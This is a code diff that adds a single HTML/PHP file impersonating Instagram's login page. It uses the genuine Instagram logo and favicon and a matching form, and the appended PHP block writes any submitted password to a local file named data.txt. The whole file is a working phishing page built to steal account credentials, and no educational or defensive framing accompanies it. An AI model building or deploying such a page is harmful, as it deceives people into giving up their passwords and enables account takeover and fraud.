@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="./insta/assets/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="shortcut icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" type="image/x-icon">
+</head>
+<body>
+<div class="box">
+    <div class="insta-box">
+        <form action="" method="post">
+        <img class="insta-box__img" src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="">
+        <input type="text" class="insta-box__username" placeholder="Phone number, username, or email">
+        <input type="password" name="textdata" class="insta-box__password" placeholder="Password">
+        <input type="submit" value="Log In" class="insta-box__submit">
+        </form>
+        <div class="insta-box__or">
+            <div class="insta-box__line1"></div>
+            <p>OR</p>
+            <div class="insta-box__line2"></div>
+        </div>
+        <div class="insta-box__fb">
+            <i class="fa fa-facebook-square" aria-hidden="true"></i>
+            <a href="">Log in with Facebook</a>
+        </div>
+        <div class="insta-box__forgotpassword">
+            <a id="forgotpassword" href="">Forgot password?</a>
+        </div>
+    </div>
+    <div class="insta-box2">
+        <p>Don't have an account?<span class="signup"> Sign up</span> </p>
+    </div>
+</div>
+</body>
+</html>
+<?php
+              
+if(isset($_POST['textdata']))
+{
+$data=$_POST['textdata'];
+$fp = fopen('data.txt', 'a');
+fwrite($fp, $data);
+fclose($fp);
+}
+?>
